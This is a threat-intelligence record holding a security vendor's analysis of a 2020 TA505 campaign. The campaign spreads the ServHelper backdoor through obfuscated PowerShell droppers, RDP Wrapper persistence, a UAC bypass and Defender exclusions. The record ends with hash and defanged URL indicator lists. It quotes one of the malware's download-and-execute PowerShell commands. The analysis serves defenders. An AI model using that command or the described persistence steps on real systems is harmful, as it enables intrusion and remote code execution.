{
    "id": "8201683b-ace7-45eb-aa99-a1b4d1c50069",
    "created_at": "2023-01-12T15:10:42.457506Z",
    "updated_at": "2025-03-27T02:15:38.132335Z",
    "deleted_at": null,
    "sha1_hash": "b838fc4ebbeb2bbffff33ef824a63941ca48cd48",
    "title": "2020-10-03 - TA505 targets the Americas in a new campaign",
    "authors": "",
    "file_creation_date": "2022-05-28T04:58:32Z",
    "file_modification_date": "2022-05-28T04:58:32Z",
    "file_size": 2293339,
    "plain_text": "# TA505 targets the Americas in a new campaign\n\n**insights.oem.avira.com/ta505-apt-group-targets-americas/**\n\nOctober 6, 2020\n\nIn late September 2020, researchers at Avira Protection Labs identified a Powershell script\noriginating from the TA505 APT group. This new campaign specifically targets the Americas.\nIn this blog, Anatoly Kazantsev, a specialist threat researcher at Avira Protection Labs, takes a\ndeep dive into the recently found TA505 APT samples and analyzes the infection cycle.\n\nOver the last few years, TA505 has been identified as the group guilty of spreading malware\nby carrying out massive malicious spam campaigns. They are the threat actors behind the\n[Dridex banking trojan and Locky, Philadelphia and GlobeImposter ransomware families.](https://threatpost.com/law-enforcement-shuts-down-dridex-operation/115036/)\n\nInterestingly, TA505 continuously evolve their attacks looking to avoid detection. Slight\nalterations within their campaigns allows them to observe security vendors’ detection\ncapabilities.\n\n## Script Analysis\n\nWe start our analysis of TA505’s new campaign using a sample with the SHA256 hash:\n_54acc99a1c3cd07cc6ece6f86795e5a19194957c11c634a5f0ea1fc52e3d08f3_\n\nWe observed that the first submission of the script dropper\n(5e212c0596f2713b44141fa6f3d563cecd5cfdabcdd5b64b3d573b28012b9bed) to VirusTotal\nwas made from Canada.\n\n\n-----\n\nIn 2019, we saw a similar campaign that was covered by other security companies such as,\nPositive technologies, Proofpoint, Trendmicro, Blueliv. Since then, the payload versions of the\nAPT group has changed to avoid detection. In August 2020, we observed cases submitted\nfrom Argentina.\n\nBelow are the droppers that we observed in the previous campaign:\n\nAt present, droppers are mostly submitted from the United States and Canada. A quick review\nof the dropper behavior:\n\n\n-----\n\nThe main difference is the Powershell script content that is split up to get-points.ps1 and\n_eula_part.*.txt. Earlier, the Powershell script contained all the payload data (we observed_\n“imports.ps1” previously).\n\n**start.vbs file content:**\n\n**uninst.exe is renamed wscript.exe with a stripped digital signature – a standard Microsoft**\nWindows utility to deal with Visual Basic scripts:\n\n\n-----\n\n### get-points.ps1 Powershell script\n\nThe original script is obfuscated and uses TripleDES in CBC mode to decrypt the next\nPowershell stage:\n\n\n-----\n\nAfter deobfuscation and decrypting, we can see the most exciting part – Base64 encoded\nstrings which contain GZipped x64-binary payloads and configuration file:\n\n\n-----\n\nWe will not dive deep into the script details in the article. Just describe the main steps that the\nscript does:\n\nDrop files on a disk:\n\n_%SystemRoot%\\Branding\\mediasrv.png_\n_%SystemRoot%\\Branding\\mediasvc.png_\n_%SystemRoot%\\Branding\\wupsvc.jpg_\n_%SystemRoot%\\system32\\rdpclip.exe_\n_%SystemRoot%\\system32\\rfxvmt.dll_\n_%Temp%\\rpds.reg_\n[Escalate privileges using the SilentCleanup technique](https://www.rapid7.com/db/modules/exploit/windows/local/bypassuac_silentcleanup)\n\nInstall, setup, and launch a new “TermService” service\nAdd Network Service (S-1-5-20) account to Administrators (S-1-5-32-544) group:\n\nSet up RDP TCP port from standard 3398 to 7201:\n\n\n-----\n\nAdd Windows Defender exclusions:\n\nA quick overview of the overall process:\n\n### TermService\n\nFirst, get-points.ps1 prepares the Windows registry with rpds.reg:\n\nAfter that, the script sets the ServiceDLL parameter to mediasrv.png full path and launches the\nTermService and RDP services:\n\n\n-----\n\nIt’s a good indicator if some service in your system has a ServiceDLL path tuned to PNGpicture.\n\nMediasrv.png is not a picture. It’s an x64 service DLL packed with UPX.\n\nAfter exploring the DLL, we realized that this is an open-source RDP Wrapper Library. Its code\n[is available on GitHub](https://github.com/stascorp/rdpwrap)\n\nBut there are some interesting changes at ServiceMain function – executable code which\nloads another DLL mediasvc.png:\n\nStrings were obfuscated with simple XOR operation. Using the IDAPython script, we\ndeobfuscated them and placed them as commentaries in the IDA Pro listing.\n\n\n-----\n\nFile wupsvc.jpg is just a configuration file for the RDP Wrapper Library:\n\nThus, using RDP Wrapper Library and TermService allows malware authors to provide\npersistence and additional RDP features.\n\n**rfxvmt.dll is a standard Windows “Microsoft RemoteFX VM transport” library and is needed to**\n[solve an issue with Windows 10 Home.](https://github.com/stascorp/rdpwrap/issues/194#issuecomment-323564111)\n\n**rdpclip.exe is also a Microsoft Windows utility (unsigned in this case), allowing users to**\ncopy/paste files and data between server and client.\n\n### mediasvc.png library\n\nNow it’s time to focus on the primary payload – a backdoor called ServHelper. Mediasvc.png is\nan x64 DLL written in Delphi and packed with UPX. DLL strings obfuscated using Vigenère\ncipher and were easily deobfuscated with IDAPython script:\n\n\n-----\n\nThe backdoor has rich functionality, most of which has been described earlier by other security\ncompanies. For example, the backdoor allows SSH tunneling using OpenSSH-Win32:\n\nCommand info gathers system information, including network connection speed. For this\npurpose, malware utilizes legitimate Powershell script from GitHub:\n\nThe encoded command contains:\n\n_IEX (New-Object_\n_Net.Webclient).downloadstring(“https://raw.githubusercontent.com/sqlitey/sqlite/master/speed.ps1”)_\n\n## C&C communication\n\nNow, let’s take a look at the malware network communication. The malware uses HTTPS and\nobfuscates data to send in a POST request:\n\n\n-----\n\nC&C hxxps://enroter1984.cn/bif/b.php. sysid field contains obfuscated campaign date/ID,\ngeneral system information, username, new RDP-user data, and random ID: sep27;Windows\n_10 (Version 10.0, Build 18362, 64-bit_\n_Edition);x64;ivan.ivanov;nouser;winacc:updwin;op1JUhTe;31337_\n\nIn the previously publicly described campaigns, malware authors didn’t use obfuscation for\nthese fields. Therefore, we can conclude that the threat actors regularly update their product to\nevade detections.\n\nIt’s worth noting an exciting part of the sysid field in campaign ID (sep27): earlier, we saw\nsamples with aug18, aug5.\n\n## Conclusion\n\nWe believe that the TA505 group is experimenting with different techniques and tools in\nvarious regions of the world. They are persistent, and in the future, we expect to see new\ncampaigns. It’s quite clear from our analysis that malware authors have started using\nlegitimate tools in their attacks, changing them from time to time. This makes such attacks\nchallenging to handle. Hence, having the highest quality prevention and detection tools are\nessential to every company involved in cyber-security.\n\nAvira Protection Labs, actively hunt, gather threat intelligence, and monitor such new APT\ngroup campaigns to provide timely detection and protection. Integrating Avira’s anti-malware\ntechnologies and [threat intelligence will help protect customers from such attacks.](https://oem.avira.com/en/solutions/threat-intelligence)\n\n## IOCs\n\n\n-----\n\n**NSIS Droppers**\n```\n5e212c0596f2713b44141fa6f3d563cecd5cfdabcdd5b64b3d573b28012b9bed\n\n```\n12fcd1479e8a25ebc58c60b7d86f6d84925ebff076a2f4c0bd41becf6540346f\n\n28f7b949d06fcd1b01e5667f338659b744451a48c027f1b4a46ae2bc26f8f155\n\n40c997e8d799f10115ae08bc20f07222da288f73bfae47b0e228526d559c1237\n\n647df9281a9416d4518c124f593e8172e588074b24b25c3b182e1715f36d6b2e\n\n15327ea9f172f0a7b14cad80a28bcd05d639b8f1692293fb27dfd55e78b43c69\n\n387151d711382e2ded59ac5cce82704f31b699a0a8edc3b0b9c43373f9102f60\n\naa1bd5df2313c90588d3b9ce7277ebd3d968b9adf2f8cefc63bddea2fb5d8a8d\n\nc23af64faf1de87e21599b5b91c5cd8331274f0991df06ca28ea8b2af882b718\n\nd945948b8d96cd7a869488d04b54c96a61ead473068fab77ed3b32ae38e152d0\n\ndb2957a62f4081b740d2044d5b8b20176e97fc4feee91bdb1f0d3b233f0cbde2\n\ndecab6a493554343028a55520afbdb9781738735a38610839c60b9b89f9e7bc3\n\ne353951c92faae1f454f636e7f85cd8dd20fe1f3db2be3c0eb3563ea318b80ce\n\nec20503b8d898dbb5386abef1f04af9a673071d4d81b5dfaf9cce08df3f47501\n\n## Powershell scripts\n```\n1b011dfa007006b77a16d4bf8a2c20fa3118c3e11f72ab8dec4ac09370b2598c\n\n```\n2ead362fd6e04c8bbe0a70ed3352308e4b5ec6146e98a433357390b25159a7b6\n\n2fd3b4665cd9703d29c1d5962bfd5ffb50c6978acf99d14bfc63c9e0e0cc8c02\n\n9bdc767ff72b642c010f6e2e25691797376bb93de2b4095351f295077872e02b\n\n13c6282241ada0629abfc3f29964aed31026c394ef715b60038851d5f910ca82\n\n72ef7a508a49bab23aa466e5dab80039d75a42a1ffb814321e961be490931642\n\n74dd7249e1ef27e48d7b49ad8ec580c804412290b250fda5c7c565bf69c61ac7\n\n90c07ffc76c4d06ac66729f5a62fa234b9a110be2a6c27a090a0774fd06f14e6\n\n365a0d0de60b1a56980ac9a94221096d00c4b388fcf3cee6b0ba98dfdb289089\n\n\n-----\n\n559e9c0238fb5802a3681821b065a4d6e38e1558cbb6b6c486043ef9a5be52ff\n\n765d659de7ea750d1610e4df04cc2ec54a6728472eff583074900503d95c0e08\n\n833ca3b9248ff9c2166e3c6f11bd5c2635f4b3da4a0780c6308a593840b4c6e2\n\n4954f81bb16dd1b91648a0b45e8696f375001f13d64cbed0cc87c0f390cebf22\n\n32828c0502f9d8b2f7fa8402e6f4f2f463d7b25636f5c87702898d1ffd0574c2\n\n178008285b115dde8a6da7acf736b8bb2d4e88d5d36a632d704ecac10993ddd3\n\n8024970091194df5681b2e6982b4d921f66c2c37f5fc7c822ede0239f0173078\n\na2e455c7d26ab747f699a718529b05818743280cdc9c6dded2c811127a6b32a3\n\na71c0e7f673ce5e786f6dfc10ad7f3f10e39bdce2a3d14102b1f91db82d527d6\n\nb4e4692207c93aa12b220ffb5e63a249a48bb167a2f3aeff265e91c4b6336d3f\n\nbc6700cc952c79281c432c16ad25d259cf9e586d212325059ae8ee7321732d59\n\nde9f92deaa968ceebf9c42d4961388ee5e5fbf1c7fb9020968fe9f50afabcdc5\n\ne36bbe8b14612735b39ee654f36b7bdbf71895d635699b02118ea318c375ecb1\n\ne5389c68852629b7cf916867fdbdaf22675d2cf995debe6337a18a0124ed0854\n\n## URLs\n\nhxxp://93.157.63.48/pop.exe\n\nhxxp://185.163.47.177/unsigned.exe\n\nhxxp://95.216.212.35/googlemap.exe\n\nhxxp://135.181.43.48/googlemap.exe\n\nhxxp://135.181.87.102/googlemap.exe\n\nhxxp://93.157.63.29/sec.exe\n\nhxxp://93.157.63.29/scm.exe\n\nhxxp://alana.jobs/wp-content/unsigned.exe\n\nhxxp://93.157.62.61/sem.exe\n\nhxxp://93.157.62.61/sema.exe\n\n\n-----\n\nhxxp://jopanovigod.xyz/f8h7ghd8gd8/index.php\n\nhxxp://bromide.xyz/ssh.zip\n\nhxxp://sdsddgu.xyz/khkhkt\n\nhxxps://canttouchtthis.cn/contact/b.php\n\nasugahwy31.xyz\n\nasfgu3ha84vzg.cn\n\nhxxps://enroter1984.cn/bif/b.php\n\nenroter1984.xyz\n\nteahgiaj3ig.cn\n\nneboley.cn\n\nAvira OEM\nLearn how to build your own security solutions with our anti-malware SDKs and threat\nintelligence\n\n[Visit website](https://oem.avira.com/?utm_source=avira.com&utm_medium=blog)\n\nAvira Protection Labs\n\n\n-----\n\nProtection Lab is the heart of Avira’s threat detection and protection unit. The researchers at\nwork in the Labs are some of the most qualified and skilled anti-malware researchers in the\nsecurity industry. They conduct highly advance research to provide the best detection and\nprotection to nearly a billion people world-wide.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-10-03 - TA505 targets the Americas in a new campaign.pdf"
    ],
    "report_names": [
        "2020-10-03 - TA505 targets the Americas in a new campaign.pdf"
    ],
    "threat_actors": [
        {
            "id": "99cb4e5b-8071-4f9e-aa1d-45bfbb6197e3",
            "created_at": "2023-01-06T13:46:38.860754Z",
            "updated_at": "2025-03-27T02:00:02.937438Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "SectorJ04 Group",
                "Dudear",
                "G0092",
                "ATK103",
                "Hive0065",
                "Spandex Tempest",
                "GRACEFUL SPIDER",
                "GOLD TAHOE",
                "CHIMBORAZO",
                "SectorJ04"
            ],
            "source_name": "MISPGALAXY:TA505",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "08c8f238-1df5-4e75-b4d8-276ebead502d",
            "created_at": "2023-01-06T13:46:39.344081Z",
            "updated_at": "2025-03-27T02:00:03.056208Z",
            "deleted_at": null,
            "main_name": "Copy-Paste",
            "aliases": [],
            "source_name": "MISPGALAXY:Copy-Paste",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "5e6b31a6-80e3-4e7d-8b0a-d94897ce9b59",
            "created_at": "2024-06-19T02:03:08.128175Z",
            "updated_at": "2025-03-27T02:05:17.400394Z",
            "deleted_at": null,
            "main_name": "GOLD TAHOE",
            "aliases": [
                "SectorJ04 ",
                "Spandex Tempest ",
                "TA505 ",
                "FIN11 "
            ],
            "source_name": "Secureworks:GOLD TAHOE",
            "tools": [
                " Cobalt Strike",
                " FlawedAmmy",
                " Get2",
                " GraceWire",
                " Malichus",
                " SDBbot",
                " ServHelper",
                " TrueBot",
                "Clop"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "75d4d6a9-b5d1-4087-a7a0-e4a9587c45f4",
            "created_at": "2022-10-25T15:50:23.5188Z",
            "updated_at": "2025-03-27T02:00:55.489882Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "TA505",
                "Hive0065",
                "Spandex Tempest",
                "CHIMBORAZO"
            ],
            "source_name": "MITRE:TA505",
            "tools": [
                "AdFind",
                "Azorult",
                "FlawedAmmyy",
                "Mimikatz",
                "Dridex",
                "TrickBot",
                "Get2",
                "FlawedGrace",
                "Cobalt Strike",
                "ServHelper",
                "Amadey",
                "SDBbot",
                "PowerSploit"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e447d393-c259-46e2-9932-19be2ba67149",
            "created_at": "2022-10-25T16:07:24.28282Z",
            "updated_at": "2025-03-27T02:02:10.159466Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "ATK 103",
                "Chimborazo",
                "Gold Evergreen",
                "Gold Tahoe",
                "Graceful Spider",
                "Hive0065",
                "Operation Tovar",
                "Operation Trident Breach",
                "SectorJ04",
                "Spandex Tempest",
                "TA505",
                "TEMP.Warlock"
            ],
            "source_name": "ETDA:TA505",
            "tools": [
                "Amadey",
                "AmmyyRAT",
                "AndroMut",
                "Azer",
                "Bart",
                "Bugat v5",
                "CryptFile2",
                "CryptoLocker",
                "CryptoMix",
                "CryptoShield",
                "Dridex",
                "Dudear",
                "EmailStealer",
                "FRIENDSPEAK",
                "Fake Globe",
                "Fareit",
                "FlawedAmmyy",
                "FlawedGrace",
                "FlowerPippi",
                "GOZ",
                "GameOver Zeus",
                "GazGolder",
                "Gelup",
                "Get2",
                "GetandGo",
                "GlobeImposter",
                "Gorhax",
                "GraceWire",
                "Gussdoor",
                "Jaff",
                "Kasidet",
                "Kegotip",
                "Kneber",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Locky",
                "MINEBRIDGE",
                "MINEBRIDGE RAT",
                "MirrorBlast",
                "Neutrino Bot",
                "Neutrino Exploit Kit",
                "P2P Zeus",
                "Peer-to-Peer Zeus",
                "Philadelphia",
                "Philadephia Ransom",
                "Pony Loader",
                "Rakhni",
                "ReflectiveGnome",
                "Remote Manipulator System",
                "RockLoader",
                "RuRAT",
                "SDBbot",
                "ServHelper",
                "Shifu",
                "Siplog",
                "TeslaGun",
                "TiniMet",
                "TinyMet",
                "Trojan.Zbot",
                "Wsnpoem",
                "Zbot",
                "Zeta",
                "ZeuS",
                "Zeus"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536242,
    "ts_updated_at": 1743041738,
    "ts_creation_date": 1653713912,
    "ts_modification_date": 1653713912,
    "files": {
        "pdf": "https://archive.orkl.eu/b838fc4ebbeb2bbffff33ef824a63941ca48cd48.pdf",
        "text": "https://archive.orkl.eu/b838fc4ebbeb2bbffff33ef824a63941ca48cd48.txt",
        "img": "https://archive.orkl.eu/b838fc4ebbeb2bbffff33ef824a63941ca48cd48.jpg"
    }
}